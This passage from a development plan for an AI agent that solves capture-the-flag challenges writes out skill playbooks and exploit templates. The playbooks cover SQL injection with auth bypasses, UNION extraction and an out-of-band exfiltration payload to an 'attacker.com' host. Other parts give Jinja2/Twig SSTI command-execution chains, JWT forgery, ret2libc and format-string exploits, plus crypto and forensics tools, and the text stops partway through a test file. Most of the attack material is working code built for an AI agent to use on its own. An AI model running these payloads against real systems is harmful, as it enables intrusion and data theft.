## Detect (in order of cost)

1. **Error-based**: append `'` or `"` to a parameter. SQL error in response? → confirmed.
2. **Boolean**: `?id=1 AND 1=1` vs `?id=1 AND 1=2`. Different content? → blind boolean.
3. **Time-based**: `?id=1' AND SLEEP(5)--` → response delayed?
4. **UNION**: test column count: `' UNION SELECT NULL--`, `' UNION SELECT NULL,NULL--`, ...

## Quick wins

### Auth bypass

```sql
-- login forms
' OR '1'='1'-- -
admin' -- -
admin'/*
") OR 1=1-- -
```

### UNION data exfil

```sql
-- after finding column count N and one string-typed column
?id=-1' UNION SELECT NULL, table_name, NULL FROM information_schema.tables-- -
?id=-1' UNION SELECT NULL, column_name, NULL FROM information_schema.columns WHERE table_name='users'-- -
?id=-1' UNION SELECT NULL, GROUP_CONCAT(username,0x7c,password), NULL FROM users-- -
```

### Blind boolean

```sql
?id=1 AND SUBSTRING((SELECT flag FROM flags),1,1)='a'
```
Automate character-by-character.

### Blind time

See `exploits/web/sqli_blind_time.py`.

## DBMS fingerprinting

- MySQL: `@@version`, `SLEEP(5)`, `CONCAT_WS`
- PostgreSQL: `version()`, `pg_sleep(5)`, `||`
- SQLite: `sqlite_version()`, quirky — no `SLEEP`
- MSSQL: `@@version`, `WAITFOR DELAY '0:0:5'`

## sqlmap automation

```bash
sqlmap -u 'http://host/page?id=1' --batch --level=3 --risk=2 --dbs
sqlmap -u '...' --data 'u=admin&p=x' --dump  # POST
sqlmap -u '...' --cookie 'sid=abc' --dbms mysql
```

## Second-order / stored SQLi

If inputs are sanitized at write but concatenated elsewhere (e.g., username stored then used in a later query), test values like `admin', (SELECT ...), '` that take effect on a secondary read.

## Out-of-band (OOB)

For databases with `LOAD_FILE` / `xp_dirtree` / DNS exfil: `?id=1 UNION SELECT LOAD_FILE(CONCAT('\\\\\\\\', (SELECT flag FROM flags), '.attacker.com\\\\x'))`.
````

- [ ] **Step 2: Write `ssti-bypass.md`**

`.claude/skills/web/ssti-bypass.md`:

````markdown
# SSTI Bypass Playbook

## Detect

Input `{{7*7}}` rendered as `49`? Jinja2/Twig/Freemarker/etc.
- `{{7*'7'}}` → `7777777` (Python-ish → Jinja2) vs `49` (Java/Twig)
- `${7*7}` → `49` (Freemarker/Spring)

## Jinja2 RCE chain

Walk up the object graph to reach `os.popen`:

```
{{''.__class__.__mro__[1].__subclasses__()}}
```
Find a class with a useful import (index varies per version):
```
{{''.__class__.__mro__[1].__subclasses__()[<idx>].__init__.__globals__['os'].popen('cat /flag').read()}}
```

Shorter using `config`:
```
{{config.__class__.__init__.__globals__['os'].popen('id').read()}}
```

Using `request.application`:
```
{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}
```

## Sandbox escapes

If `{{ }}` filters `_` or `.`, try:
```
{{"".__class__}}                 # normal
{{''|attr('__class__')}}         # bypass via |attr
{{request['application']['__globals__']['os']['popen']('id')['read']()}}  # subscript
{{()["\x5f\x5fclass\x5f\x5f"]}}  # hex escapes
```

## Twig / Symfony

```
{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}
```

## Freemarker / Velocity (Java)

```
<#assign ex="freemarker.template.utility.Execute"?new()>
${ ex("id") }
```

## Payload templates

See `exploits/web/ssti_jinja2.py`.
````

- [ ] **Step 3: Write `jwt-attacks.md`**

`.claude/skills/web/jwt-attacks.md`:

````markdown
# JWT Attacks Playbook

## Decode first

```python
import jwt
print(jwt.decode(token, options={"verify_signature": False}))
```
Or:
```bash
echo $TOKEN | cut -d. -f1 | base64 -d
echo $TOKEN | cut -d. -f2 | base64 -d
```

## alg=none

If the server accepts `alg: none`:
```python
import jwt
forged = jwt.encode({"user": "admin"}, "", algorithm="none")
```
Some libs reject empty signature — try `{"alg": "none"}` with an empty third segment.

See `exploits/web/jwt_none_alg.py`.

## Weak HMAC secret

Brute-force the HS256 secret:
```bash
# jwt_tool or hashcat
hashcat -m 16500 token.txt wordlist.txt
```
Common weak secrets: `secret`, `password`, `jwt`, `admin`, app name, the host name.

## Algorithm confusion (RS256 → HS256)

If server uses RSA and public key is available, re-sign with HS256 using the public key bytes as the HMAC key:
```python
import jwt
with open('public.pem') as f:
    pub = f.read()
forged = jwt.encode({"user":"admin"}, pub, algorithm="HS256")
```

## kid injection

If `kid` header is used in a file path or SQL lookup:
```json
{"alg":"HS256","typ":"JWT","kid":"../../dev/null"}
```
This forces the key to be empty → sign with empty key. Or SQL: `"kid":"x' UNION SELECT 'password"`.

## JWK embedded

If `jwk` header is accepted, you can embed your own public key:
```json
{"alg":"RS256","jwk":{"kty":"RSA","n":"<your-n>","e":"AQAB"}}
```
Sign with your private key — server validates using the jwk you supplied.
````

- [ ] **Step 4: Commit**

```bash
git add .claude/skills/web/
git commit -m "feat(prompt): web skills — sqli + ssti + jwt"
```

---

## Task 24: Forensics skill (stego-checklist)

**Files:**
- Create: `.claude/skills/forensics/stego-checklist.md`

- [ ] **Step 1: Write `stego-checklist.md`**

`.claude/skills/forensics/stego-checklist.md`:

````markdown
# Stego & Hidden-Data Checklist

Run these in order. Most stego CTFs fall in the first 5 steps.

## 1. Metadata

```bash
exiftool <file>
identify -verbose <img>    # ImageMagick — more detail for images
mediainfo <file>           # for audio/video
```
Look for: Comment, Description, Title, Artist, custom XMP/IPTC fields.

## 2. Strings sweep

```bash
strings -n 8 -e l <file> | grep -iE 'flag|ctf|key|pass'
strings -n 8 -e b <file> | grep -iE 'flag|ctf'   # big-endian wide chars
```

## 3. Binwalk

```bash
binwalk <file>             # list embedded
binwalk -e <file>          # extract
# Then recurse on extracted contents.
```
Look for embedded ZIPs, PNGs, PDFs inside the carrier.

## 4. Appended data

Images often have data appended past the official end marker:
```bash
# PNG: IEND marker is "49 45 4e 44 ae 42 60 82"
# JPG: ends with "ff d9"
# Extract everything after:
python3 -c "
d = open('img.png','rb').read()
idx = d.rfind(b'\\x49\\x45\\x4e\\x44\\xaeB\\x60\\x82')
open('tail.bin','wb').write(d[idx+8:])
"
```

## 5. LSB

```bash
zsteg <png>                # automatic multi-channel LSB for PNG/BMP
zsteg -a <png>             # try all permutations
```
For JPG, LSB doesn't work directly (lossy). Try:
```bash
steghide extract -sf <jpg>        # prompts for password — try blank, filename, obvious guesses
```
Custom LSB: `exploits/forensics/lsb_extract.py`.

## 6. Visual / spectral (audio + images)

- Images: load in GIMP, flip channels. Or `stegsolve`.
- Audio: open in Sonic Visualiser → add spectrogram layer. Text often appears visually.
- Alternative: `sox input.wav -n spectrogram -o out.png`

## 7. Filesystem slack (disk/memory)

```bash
file <img>                       # is it a disk image? partition table?
mmls <img>                       # sleuthkit partitions
fls -r <img>                     # file listing including deleted
icat <img> <inum> > recovered    # recover a specific inode
```

## 8. Common encodings to try on any suspicious blob

```python
import base64, zlib, bz2, gzip
for fn in [lambda b: base64.b64decode(b+b'=='),
           lambda b: base64.b32decode(b),
           lambda b: base64.b85decode(b),
           lambda b: bytes.fromhex(b.decode()),
           lambda b: zlib.decompress(b),
           lambda b: bz2.decompress(b),
           lambda b: gzip.decompress(b)]:
    try: print(fn(blob))
    except Exception: pass
```

## When all else fails

- Google the filename / exact strings — previous writeups may exist.
- Check tail vs head byte statistics (entropy) — encrypted vs encoded vs random.
- Try XOR with filename, challenge name, or obvious keys.
````

- [ ] **Step 2: Commit**

```bash
git add .claude/skills/forensics/
git commit -m "feat(prompt): forensics skill — stego-checklist"
```

---

## Task 25: Crypto exploit templates (6 files)

**Files:**
- Create: `exploits/crypto/rsa_wiener.py`
- Create: `exploits/crypto/rsa_hastad_small_e.py`
- Create: `exploits/crypto/rsa_common_modulus.py`
- Create: `exploits/crypto/rsa_fermat.py`
- Create: `exploits/crypto/lcg_predict.py`
- Create: `exploits/crypto/xor_known_plaintext.py`

**Why:** Spec §4.6 — battle-tested working scripts a specialist copies to `./work/solve.py` and fills blanks. Curated / adapted from RsaCtfTool, PayloadsAllTheThings, and public writeups.

- [ ] **Step 1: Write `exploits/crypto/rsa_wiener.py`**

```python
"""Wiener's attack on RSA — small private exponent.

Signal: d < n^0.25. Often triggered by very large public e.

Usage:
  1. Fill in n, e, c below.
  2. `python3 solve.py`
  3. If `m` looks garbage, re-check if Wiener applies (d usually needs to be tiny).
"""
from Crypto.Util.number import long_to_bytes


def continued_fraction(n, d):
    while d:
        q = n // d
        yield q
        n, d = d, n - q * d


def convergents(cf):
    n0, n1 = 0, 1
    d0, d1 = 1, 0
    for a in cf:
        n0, n1 = n1, a * n1 + n0
        d0, d1 = d1, a * d1 + d0
        yield n0, d0


def wiener(e, n):
    for k, d in convergents(continued_fraction(e, n)):
        if k == 0:
            continue
        phi = (e * d - 1) // k
        # Solve x^2 - (n - phi + 1)x + n = 0 for p, q
        s = n - phi + 1
        disc = s * s - 4 * n
        if disc < 0:
            continue
        r = int(disc ** 0.5)
        if r * r == disc and (s + r) % 2 == 0:
            return d
    return None


if __name__ == "__main__":
    n = 0  # TODO: fill in
    e = 0  # TODO: fill in
    c = 0  # TODO: fill in

    d = wiener(e, n)
    assert d is not None, "Wiener didn't converge — d may not be small enough."
    m = pow(c, d, n)
    print(long_to_bytes(m))
```

- [ ] **Step 2: Write `exploits/crypto/rsa_hastad_small_e.py`**

```python
"""Hastad / low-exponent RSA — small e, short m.

Single-ciphertext case (m^e < n): just take the e-th root.
Broadcast case (>= e ciphertexts, same m, different n): CRT combine then root.
"""
from Crypto.Util.number import long_to_bytes
from gmpy2 import iroot, mpz


def single(c, e):
    m, exact = iroot(mpz(c), e)
    if not exact:
        return None
    return int(m)


def crt(values, moduli):
    from functools import reduce
    total = 0
    prod = reduce(lambda a, b: a * b, moduli)
    for v, m in zip(values, moduli):
        p = prod // m
        total += v * p * pow(p, -1, m)
    return total % prod


def broadcast(cs, ns, e):
    combined = crt(cs, ns)
    m, exact = iroot(mpz(combined), e)
    if not exact:
        return None
    return int(m)


if __name__ == "__main__":
    # Mode A: single ciphertext
    n = 0  # TODO
    e = 3
    c = 0  # TODO
    m = single(c, e)
    if m is not None:
        print("single:", long_to_bytes(m))
    else:
        print("single e-th root not exact — likely m^e >= n. Try broadcast mode.")

    # Mode B: broadcast (uncomment and fill in)
    # cs = [c1, c2, c3]
    # ns = [n1, n2, n3]
    # m = broadcast(cs, ns, e)
    # print("broadcast:", long_to_bytes(m))
```

- [ ] **Step 3: Write `exploits/crypto/rsa_common_modulus.py`**

```python
"""RSA common-modulus attack.

Same n, two coprime e's, two ciphertexts of the same m.
m = c1^a * c2^b mod n where a*e1 + b*e2 = 1.
"""
from math import gcd
from Crypto.Util.number import long_to_bytes


def egcd(a, b):
    if b == 0:
        return a, 1, 0
    g, x, y = egcd(b, a % b)
    return g, y, x - (a // b) * y


def common_modulus(c1, c2, e1, e2, n):
    g, a, b = egcd(e1, e2)
    assert g == 1, "e1 and e2 must be coprime"
    if a < 0:
        c1 = pow(c1, -1, n)
        a = -a
    if b < 0:
        c2 = pow(c2, -1, n)
        b = -b
    return (pow(c1, a, n) * pow(c2, b, n)) % n


if __name__ == "__main__":
    n = 0   # TODO
    e1 = 0  # TODO
    e2 = 0  # TODO
    c1 = 0  # TODO
    c2 = 0  # TODO

    m = common_modulus(c1, c2, e1, e2, n)
    print(long_to_bytes(m))
```

- [ ] **Step 4: Write `exploits/crypto/rsa_fermat.py`**

```python
"""Fermat factoring — p and q close together.

Starts a = ceil(sqrt(n)), walks upward.
If p and q are close, converges in seconds. If not, abandon after 2**22 iters.
"""
from math import isqrt
from Crypto.Util.number import long_to_bytes


def fermat(n, max_iter=1 << 22):
    a = isqrt(n)
    if a * a < n:
        a += 1
    for _ in range(max_iter):
        b2 = a * a - n
        b = isqrt(b2)
        if b * b == b2:
            return (a - b, a + b)
        a += 1
    return None


if __name__ == "__main__":
    n = 0  # TODO
    e = 0  # TODO
    c = 0  # TODO

    pq = fermat(n)
    assert pq is not None, "Fermat did not converge; primes are not close."
    p, q = pq
    phi = (p - 1) * (q - 1)
    d = pow(e, -1, phi)
    m = pow(c, d, n)
    print(long_to_bytes(m))
```

- [ ] **Step 5: Write `exploits/crypto/lcg_predict.py`**

```python
"""Predict an LCG's next outputs from known outputs.

LCG: x_{n+1} = (a*x_n + c) mod m

Given a handful of consecutive outputs and sometimes knowledge of m,
recover (a, c, m) and then predict forward.
"""
from math import gcd
from functools import reduce


def modinv(a, m):
    return pow(a, -1, m)


def recover_modulus(outputs):
    # Given >=6 outputs, find m via GCD of determinants.
    t = [outputs[i+1] - outputs[i] for i in range(len(outputs)-1)]
    z = [abs(t[i+2]*t[i] - t[i+1]**2) for i in range(len(t)-2)]
    m = reduce(gcd, z)
    return m


def recover_ac(outputs, m):
    a = ((outputs[2] - outputs[1]) * modinv(outputs[1] - outputs[0], m)) % m
    c = (outputs[1] - a * outputs[0]) % m
    return a, c


def predict_next(x, a, c, m, n):
    out = []
    for _ in range(n):
        x = (a * x + c) % m
        out.append(x)
    return out


if __name__ == "__main__":
    # TODO: replace with the observed outputs
    outputs = [12345, 67890, 54321]  # ≥6 preferred for stable recovery
    m = recover_modulus(outputs)
    a, c = recover_ac(outputs, m)
    print(f"recovered m={m}, a={a}, c={c}")
    print("next 5:", predict_next(outputs[-1], a, c, m, 5))
```

- [ ] **Step 6: Write `exploits/crypto/xor_known_plaintext.py`**

```python
"""Recover repeating-key XOR given partial known plaintext.

If key length is unknown, try lengths 2..40 and rank by English-like output.
"""
from itertools import cycle


def xor_bytes(a, b):
    return bytes(x ^ y for x, y in zip(a, cycle(b)))


def find_key(ciphertext, crib):
    # crib = known plaintext fragment (e.g., b'flag{')
    # For each offset and key-length guess, derive candidate key.
    best = None
    for keylen in range(2, 41):
        for off in range(len(ciphertext) - len(crib)):
            key_fragment = bytes(
                c ^ p for c, p in zip(ciphertext[off:off + len(crib)], crib)
            )
            # Align into a full-length key (truncate to keylen)
            candidate_key = (key_fragment * (keylen // len(crib) + 1))[:keylen]
            pt = xor_bytes(ciphertext, candidate_key)
            score = sum(32 <= b < 127 for b in pt) / len(pt)
            if best is None or score > best[0]:
                best = (score, candidate_key, pt)
    return best


if __name__ == "__main__":
    ct_hex = ""  # TODO paste hex
    crib = b"flag{"
    ct = bytes.fromhex(ct_hex)
    score, key, pt = find_key(ct, crib)
    print("key:", key)
    print("plaintext:", pt[:200])
```

- [ ] **Step 7: Commit**

```bash
git add exploits/crypto/
git commit -m "feat(exploits): 6 crypto templates (wiener, hastad, common-mod, fermat, lcg, xor)"
```

---

## Task 26: Web exploit templates (3 files)

**Files:**
- Create: `exploits/web/sqli_blind_time.py`
- Create: `exploits/web/ssti_jinja2.py`
- Create: `exploits/web/jwt_none_alg.py`

- [ ] **Step 1: Write `exploits/web/sqli_blind_time.py`**

```python
"""Blind time-based SQLi — char-by-char exfil."""
import requests
import time

URL = "http://host/page"  # TODO
PARAM = "id"
PAYLOAD_TMPL = (
    "{base}' AND IF((ASCII(SUBSTRING(({query}),{idx},1))={c}),SLEEP(3),0)-- -"
)
BASE = "1"
QUERY = "SELECT flag FROM flags LIMIT 1"  # TODO
THRESHOLD = 2.5  # seconds — adjust for noisy networks


def fetch(payload):
    start = time.time()
    requests.get(URL, params={PARAM: payload}, timeout=10)
    return time.time() - start


def extract(length=50):
    out = ""
    for i in range(1, length + 1):
        for c in range(32, 127):
            p = PAYLOAD_TMPL.format(base=BASE, query=QUERY, idx=i, c=c)
            if fetch(p) > THRESHOLD:
                out += chr(c)
                print(f"[{i}] {out}")
                break
        else:
            print(f"[{i}] no char matched — try widening range or stop")
            break
    return out


if __name__ == "__main__":
    print(extract())
```

- [ ] **Step 2: Write `exploits/web/ssti_jinja2.py`**

```python
"""Jinja2 SSTI — sandbox escape to OS command."""
import requests

URL = "http://host/search"  # TODO
PARAM = "q"
CMD = "cat /flag*"  # TODO

PAYLOADS = [
    # No-underscore bypass:
    "{{config.__class__.__init__.__globals__['os'].popen(%r).read()}}" % CMD,
    # Subscript-only bypass (filter blocks dots):
    "{{request['application']['__globals__']['__builtins__']['__import__']"
    "('os')['popen'](%r)['read']()}}" % CMD,
    # |attr bypass:
    "{{''|attr('__class__')|attr('__mro__')}}",  # recon — then fill in mro[1].__subclasses__()
]


def try_payload(p):
    r = requests.get(URL, params={PARAM: p})
    return r.text


if __name__ == "__main__":
    for p in PAYLOADS:
        print("----- payload:", p[:80])
        print(try_payload(p)[:500])
```

- [ ] **Step 3: Write `exploits/web/jwt_none_alg.py`**

```python
"""JWT alg=none forging.

Some libraries accept {"alg":"none"} with an empty signature and treat the
token as trusted. Try this first before bothering with HS256 cracking.
"""
import base64
import json
import sys
import requests

URL = "http://host/admin"  # TODO
COOKIE_NAME = "token"


def b64url(data: bytes) -> str:
    return base64.urlsafe_b64encode(data).rstrip(b"=").decode()


def forge(payload: dict) -> str:
    header = {"alg": "none", "typ": "JWT"}
    h = b64url(json.dumps(header, separators=(",", ":")).encode())
    p = b64url(json.dumps(payload, separators=(",", ":")).encode())
    return f"{h}.{p}."  # empty sig


if __name__ == "__main__":
    token = forge({"user": "admin", "is_admin": True})
    print("forged token:", token)
    r = requests.get(URL, cookies={COOKIE_NAME: token})
    print(r.status_code)
    print(r.text[:1000])
```

- [ ] **Step 4: Commit**

```bash
git add exploits/web/
git commit -m "feat(exploits): 3 web templates (blind-sqli, ssti-jinja2, jwt-none)"
```

---

## Task 27: Pwn exploit templates (3 files)

**Files:**
- Create: `exploits/pwn/ret2libc.py`
- Create: `exploits/pwn/fmtstr_leak.py`
- Create: `exploits/pwn/angr_find_input.py`

- [ ] **Step 1: Write `exploits/pwn/ret2libc.py`**

```python
"""Classic ret2libc exploit template for x86_64.

Fill in:
  - BINARY path
  - REMOTE host/port
  - OFFSET from buffer start to saved RIP
  - a known-resolved GOT symbol for the leak (e.g. 'puts', 'printf')
"""
from pwn import *

BINARY = "./challenge/chal"          # TODO
LIBC_PATH = "./challenge/libc.so.6"  # or None to use system libc
REMOTE_HOST = "host"                 # TODO
REMOTE_PORT = 1337                   # TODO
OFFSET = 72                          # TODO
LEAK_SYM = "puts"                    # TODO — must be resolved before leak

context.binary = elf = ELF(BINARY)
libc = ELF(LIBC_PATH) if LIBC_PATH else None


def conn():
    if args.REMOTE:
        return remote(REMOTE_HOST, REMOTE_PORT)
    return process(elf.path)


def stage1():
    io = conn()
    rop = ROP(elf)
    rop.call("puts", [elf.got[LEAK_SYM]])
    rop.call(elf.symbols.get("main") or elf.entry, [])
    payload = flat({OFFSET: rop.chain()})
    io.sendlineafter(b":", payload)  # TODO: adjust prompt
    # Expect the leaked 6-byte address in the first line of the response.
    io.recvline()
    leak = u64(io.recv(6).ljust(8, b"\x00"))
    log.success(f"{LEAK_SYM} leak: {leak:#x}")
    return io, leak


def stage2(io, leak):
    global libc
    if libc is None:
        libc = ELF.from_assembly("")  # will fail — you must provide libc
    libc.address = leak - libc.symbols[LEAK_SYM]
    log.success(f"libc base: {libc.address:#x}")

    binsh = next(libc.search(b"/bin/sh\x00"))
    rop = ROP(libc)
    rop.raw(rop.ret.address)  # stack alignment on Ubuntu
    rop.call("system", [binsh])
    payload = flat({OFFSET: rop.chain()})
    io.sendlineafter(b":", payload)
    io.interactive()


if __name__ == "__main__":
    io, leak = stage1()
    stage2(io, leak)
```

- [ ] **Step 2: Write `exploits/pwn/fmtstr_leak.py`**

```python
"""Format-string exploit template — leak libc + overwrite GOT.

Assumes:
  - You've identified the stack offset N such that "%N$p" reads the N-th
    value off the stack (often 6–10 for x86_64 after argv).
  - Program loops reading from stdin, so the overwritten function gets
    called again after the payload.
"""
from pwn import *

BINARY = "./challenge/chal"  # TODO
REMOTE_HOST = "host"         # TODO
REMOTE_PORT = 1337           # TODO
OFFSET = 6                   # TODO — stack offset for %p
LIBC_LEAK_FN = "puts"        # TODO

context.binary = elf = ELF(BINARY)


def conn():
    if args.REMOTE:
        return remote(REMOTE_HOST, REMOTE_PORT)
    return process(elf.path)


def leak_libc(io):
    """Leak a resolved GOT entry and return the libc address it points to."""
    payload = f"%{OFFSET}$s".encode().ljust(8, b"\x00") + p64(elf.got[LIBC_LEAK_FN])
    io.sendline(payload)
    raw = io.recvline()
    # Parse: first 8 bytes of the output after whatever prompt.
    leaked = u64(raw[:6].ljust(8, b"\x00"))
    log.success(f"leaked {LIBC_LEAK_FN} addr: {leaked:#x}")
    return leaked


def overwrite_got(io, target_got, target_addr):
    payload = fmtstr_payload(OFFSET, {target_got: target_addr})
    io.sendline(payload)


if __name__ == "__main__":
    io = conn()
    leak = leak_libc(io)
    # libc = ELF('./challenge/libc.so.6'); libc.address = leak - libc.symbols[LIBC_LEAK_FN]
    # overwrite_got(io, elf.got['printf'], libc.symbols['system'])
    # io.sendline(b'/bin/sh')
    io.interactive()
```

- [ ] **Step 3: Write `exploits/pwn/angr_find_input.py`**

```python
"""angr skeleton — find input that reaches a `win` address.

Use when the binary is small (<100 KB) and the check is a deterministic
series of comparisons (common for rev-style "guess the password" chals).
"""
import angr
import claripy

BINARY = "./challenge/chal"  # TODO
INPUT_LEN = 32               # TODO — estimate
FIND_ADDR = 0x401234         # TODO — address of "Correct!" or win()
AVOID_ADDRS = [0x40126a]     # TODO — address of "Wrong!"


def solve():
    proj = angr.Project(BINARY, auto_load_libs=False)
    flag = claripy.BVS("flag", INPUT_LEN * 8)
    state = proj.factory.entry_state(
        stdin=flag,
        add_options={angr.options.LAZY_SOLVES},
    )
    # constrain to printable
    for byte in flag.chop(8):
        state.add_constraints(byte >= 0x20, byte <= 0x7e)

    sm = proj.factory.simulation_manager(state)
    sm.explore(find=FIND_ADDR, avoid=AVOID_ADDRS)

    if sm.found:
        found = sm.found[0]
        s = found.solver.eval(flag, cast_to=bytes)
        print("input:", s)
    else:
        print("angr found no path")


if __name__ == "__main__":
    solve()
```

- [ ] **Step 4: Commit**

```bash
git add exploits/pwn/
git commit -m "feat(exploits): 3 pwn templates (ret2libc, fmtstr, angr)"
```

---

## Task 28: Forensics exploit templates (3 files)

**Files:**
- Create: `exploits/forensics/lsb_extract.py`
- Create: `exploits/forensics/volatility_profile.py`
- Create: `exploits/forensics/pcap_extract_creds.py`

- [ ] **Step 1: Write `exploits/forensics/lsb_extract.py`**

```python
"""Extract LSB-hidden data from PNG/BMP images.

Prefer `zsteg` first. This template is for custom LSB schemes or PNG variants
zsteg misses (e.g., specific channel + bit ordering).
"""
from PIL import Image
import sys


def lsb_extract(path, bit=0, channels="RGB", order="row", max_bytes=1024):
    img = Image.open(path).convert("RGBA")
    w, h = img.size
    pixels = img.load()

    bits = []
    if order == "row":
        iterator = ((x, y) for y in range(h) for x in range(w))
    else:  # column
        iterator = ((x, y) for x in range(w) for y in range(h))

    for x, y in iterator:
        r, g, b, a = pixels[x, y]
        px = {"R": r, "G": g, "B": b, "A": a}
        for ch in channels:
            bits.append((px[ch] >> bit) & 1)
        if len(bits) >= max_bytes * 8:
            break

    return bits_to_bytes(bits)


def bits_to_bytes(bits):
    out = bytearray()
    for i in range(0, len(bits) - 7, 8):
        b = 0
        for j in range(8):
            b = (b << 1) | bits[i + j]
        out.append(b)
    return bytes(out)


if __name__ == "__main__":
    path = sys.argv[1] if len(sys.argv) > 1 else "./challenge/img.png"
    for order in ("row", "column"):
        for channels in ("R", "G", "B", "RGB", "RGBA"):
            for bit in range(3):
                data = lsb_extract(path, bit=bit, channels=channels, order=order)
                if b"flag{" in data.lower() or b"CTF{" in data:
                    print(f"HIT order={order} channels={channels} bit={bit}")
                    print(data[:400])
```

- [ ] **Step 2: Write `exploits/forensics/volatility_profile.py`**

```python
"""Wrapper to identify OS/profile for a memory dump and run common plugins.

Assumes volatility3 is installed (it is, per the Docker image).
"""
import subprocess
import sys


def try_plugins(dump_path):
    quick = [
        "windows.info",
        "linux.banners",
        "mac.mac_version_json",
    ]
    for p in quick:
        print(f"\n----- {p} -----")
        r = subprocess.run(
            ["volatility3", "-f", dump_path, p],
            capture_output=True, text=True, timeout=300,
        )
        print(r.stdout[:2000])
        if r.returncode == 0 and len(r.stdout) > 200:
            return p.split(".")[0]  # os family
    return None


def dig_deeper(dump_path, os_family):
    plugins = {
        "windows": ["pslist", "cmdline", "netstat", "hashdump", "clipboard.Clipboard"],
        "linux":   ["bash", "pslist", "psaux"],
        "mac":     ["pslist", "bash_hist"],
    }.get(os_family, [])
    for p in plugins:
        full = f"{os_family}.{p}"
        print(f"\n===== {full} =====")
        r = subprocess.run(
            ["volatility3", "-f", dump_path, full],
            capture_output=True, text=True, timeout=600,
        )
        print(r.stdout[:5000])


if __name__ == "__main__":
    dump = sys.argv[1] if len(sys.argv) > 1 else "./challenge/dump.mem"
    family = try_plugins(dump)
    if family:
        dig_deeper(dump, family)
```

- [ ] **Step 3: Write `exploits/forensics/pcap_extract_creds.py`**

```python
"""Sweep a pcap for HTTP basic auth, form posts, FTP/SMTP/IMAP creds, and
text that looks flag-shaped."""
import re
import subprocess
import sys


FLAG_RE = re.compile(rb"[A-Za-z0-9_]+\{[^}]+\}")


def tshark(pcap, display_filter=None):
    cmd = ["tshark", "-r", pcap, "-Q"]
    if display_filter:
        cmd += ["-Y", display_filter]
    cmd += ["-T", "fields", "-e", "data"]
    r = subprocess.run(cmd, capture_output=True, timeout=120)
    return r.stdout


def sweep(pcap):
    found = []

    # HTTP basic auth
    r = subprocess.run(
        ["tshark", "-r", pcap, "-Y", "http.authorization", "-T", "fields",
         "-e", "http.authorization"],
        capture_output=True, text=True,
    )
    if r.stdout.strip():
        found.append(("http.authorization", r.stdout.strip()))

    # Form posts
    r = subprocess.run(
        ["tshark", "-r", pcap, "-Y", "http.request.method==POST", "-T", "fields",
         "-e", "http.file_data"],
        capture_output=True, text=True,
    )
    if r.stdout.strip():
        found.append(("http-post", r.stdout[:4000]))

    # FTP/SMTP/IMAP
    for proto in ("ftp", "smtp", "imap"):
        r = subprocess.run(
            ["tshark", "-r", pcap, "-Y", f"{proto}", "-T", "fields", "-e", f"{proto}.request.command", "-e", f"{proto}.request.parameter"],
            capture_output=True, text=True,
        )
        if r.stdout.strip():
            found.append((proto, r.stdout[:4000]))

    # Raw flag regex over hex dump
    r = subprocess.run(["tshark", "-r", pcap, "-x"], capture_output=True)
    flags = FLAG_RE.findall(r.stdout)
    if flags:
        found.append(("flag-regex", flags))

    return found


if __name__ == "__main__":
    pcap = sys.argv[1] if len(sys.argv) > 1 else "./challenge/capture.pcap"
    for kind, data in sweep(pcap):
        print(f"\n--- {kind} ---")
        print(data)
```

- [ ] **Step 4: Commit**

```bash
git add exploits/forensics/
git commit -m "feat(exploits): 3 forensics templates (lsb, volatility, pcap)"
```

---

## Task 29: Integration test with fake docker

**Files:**
- Create: `tests/integration/test_pipeline.py`
- Create: `tests/integration/fake_docker.py`
- Create: `tests/integration/conftest.py`

**Why:** Exercise the whole orchestrator path (normalize → workdir → worker → flag → results) without needing a real Docker daemon. `fake_docker.py` is a Python script placed on `PATH` that emits canned output.

- [ ] **Step 1: Create `tests/integration/fake_docker.py`**

```python
#!/usr/bin/env python3
"""Fake `docker` CLI for integration tests.

Reads the scenario from env var FAKE_DOCKER_SCENARIO. The file format is
JSON:
  {
    "<container-name-prefix>": {
      "stdout": "<stdout to emit>",
      "stderr": "<stderr to emit>",
      "exit_code": 0,
      "flag_file": "<text to write to /workspace/flag.txt>",   # optional
      "sleep_s": 0                                             # optional
    },
    ...
  }
We match the container name (passed via --name) by prefix.
"""
import json
import os
import re
import sys
import time
from pathlib import Path


def parse_args(argv):
    # Extract --name and -v <src>:<dst>
    name = None
    mounts: list[tuple[str, str]] = []
    i = 0
    while i < len(argv):
        if argv[i] == "--name" and i + 1 < len(argv):
            name = argv[i + 1]
            i += 2
        elif argv[i] == "-v" and i + 1 < len(argv):
            src, dst = argv[i + 1].split(":", 1)
            if dst.endswith(":ro"):
                dst = dst[:-3]
            mounts.append((src, dst))
            i += 2
        else:
            i += 1
    return name, mounts


def main():
    argv = sys.argv[1:]
    if not argv or argv[0] != "run":
        # stop, exec, etc — no-op for tests
        return 0

    name, mounts = parse_args(argv)

    scenario_path = os.environ.get("FAKE_DOCKER_SCENARIO", "")
    if not scenario_path:
        print("fake_docker: FAKE_DOCKER_SCENARIO not set", file=sys.stderr)
        return 1

    scenarios = json.loads(Path(scenario_path).read_text())
    matched = None
    for prefix, scen in scenarios.items():
        if name and name.startswith(f"hydra-{prefix}-"):
            matched = scen
            break
    if matched is None:
        print(f"fake_docker: no scenario for {name}", file=sys.stderr)
        return 1

    if matched.get("sleep_s"):
        time.sleep(matched["sleep_s"])

    # Write flag.txt inside the mounted workdir if requested
    if "flag_file" in matched:
        for src, dst in mounts:
            if dst == "/workspace":
                (Path(src) / "flag.txt").write_text(matched["flag_file"])
                break

    sys.stdout.write(matched.get("stdout", ""))
    sys.stderr.write(matched.get("stderr", ""))
    return matched.get("exit_code", 0)


if __name__ == "__main__":
    sys.exit(main())
```

- [ ] **Step 2: Create `tests/integration/conftest.py`**

```python
import os
import stat
import tempfile
from pathlib import Path
import pytest

FAKE = Path(__file__).parent / "fake_docker.py"

@pytest.fixture
def fake_docker(monkeypatch, tmp_path):
    """Prepend a tmp dir containing a `docker` shim to PATH."""
    shim_dir = tmp_path / "shim"
    shim_dir.mkdir()
    shim = shim_dir / "docker"
    shim.write_text(f"#!/usr/bin/env python3\nimport runpy\nrunpy.run_path({str(FAKE)!r}, run_name='__main__')\n")
    shim.chmod(shim.stat().st_mode | stat.S_IEXEC | stat.S_IXGRP | stat.S_IXOTH)
    monkeypatch.setenv("PATH", f"{shim_dir}{os.pathsep}{os.environ['PATH']}")

    scenario_path = tmp_path / "scenario.json"
    monkeypatch.setenv("FAKE_DOCKER_SCENARIO", str(scenario_path))
    return scenario_path
```

- [ ] **Step 3: Create `tests/integration/test_pipeline.py`**

```python
import json
from pathlib import Path
import pytest
from hydra.models import Challenge
